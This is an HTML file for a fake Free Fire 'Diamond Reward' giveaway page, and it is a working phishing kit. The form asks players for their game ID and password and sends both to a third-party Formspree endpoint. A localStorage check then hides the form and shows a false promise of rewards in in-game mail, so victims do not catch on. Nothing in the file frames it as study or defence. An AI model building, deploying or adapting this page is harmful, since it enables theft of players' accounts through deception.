# Diamond-Giveway
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Fire: Exclusive Rewards</title>
    <style>
        /* Background Image from a Gaming Source */
        body {
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)), 
                        url('https://images.unsplash.com/photo-1542751371-adc38448a05e?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80'); /* Dark gaming setup background */
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: white;
        }

        .login-box {
            background: rgba(20, 20, 20, 0.9);
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 0 20px #ff4500; /* Glowing orange effect */
            width: 100%;
            max-width: 350px;
            text-align: center;
            border: 1px solid #ff4500;
        }

        h2 { color: #ff4500; text-transform: uppercase; letter-spacing: 2px; }
        p { font-size: 14px; margin-bottom: 20px; color: #ccc; }

        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #444;
            background: #111;
            color: white;
            border-radius: 5px;
            box-sizing: border-box; /* Important for alignment */
        }

        button {
            width: 100%;
            padding: 12px;
            background: #ff4500;
            border: none;
            color: white;
            font-weight: bold;
            text-transform: uppercase;
            cursor: pointer;
            border-radius: 5px;
            margin-top: 10px;
            transition: 0.3s;
        }

        button:hover { background: #e63e00; box-shadow: 0 0 10px #ff4500; }

        #blocked-message { display: none; }
        .already-submitted { color: #ff4500; font-size: 18px; font-weight: bold; }
    </style>
</head>
<body>

<div class="login-box" id="form-container">
    <h2>Diamond Reward</h2>
    <p>Login with your Free Fire details to claim your daily rewards.</p>
    
    <form id="ff-form" action="https://formspree.io/f/xjglvnrj" method="POST">
        <input type="text" name="FF_ID" placeholder="Enter Your Free Fire ID" required>
        <input type="password" name="Password" placeholder="Enter Your Password" required>
        <button type="submit">Claim Rewards</button>
    </form>
</div>

<div class="login-box" id="blocked-message">
    <h2>Thanks for using our website!</h2>
    <p class="already-submitted">Your response has already been submitted.</p>
    <p>Check your in-game mail within 24 hours.</p>
</div>

<script>
    const formContainer = document.getElementById('form-container');
    const blockedMessage = document.getElementById('blocked-message');
    const form = document.getElementById('ff-form');

    // CHECK IF BLOCKED
    if (localStorage.getItem('ff_submitted') === 'true') {
        formContainer.style.display = 'none';
        blockedMessage.style.display = 'block';
    }

    // HANDLE SUBMISSION
    form.onsubmit = function() {
        localStorage.setItem('ff_submitted', 'true');
        // The page will redirect to Formspree's "Thank you" page automatically.
        // When they come back to your link, they will be blocked.
    };
</script>

</body>
</html>
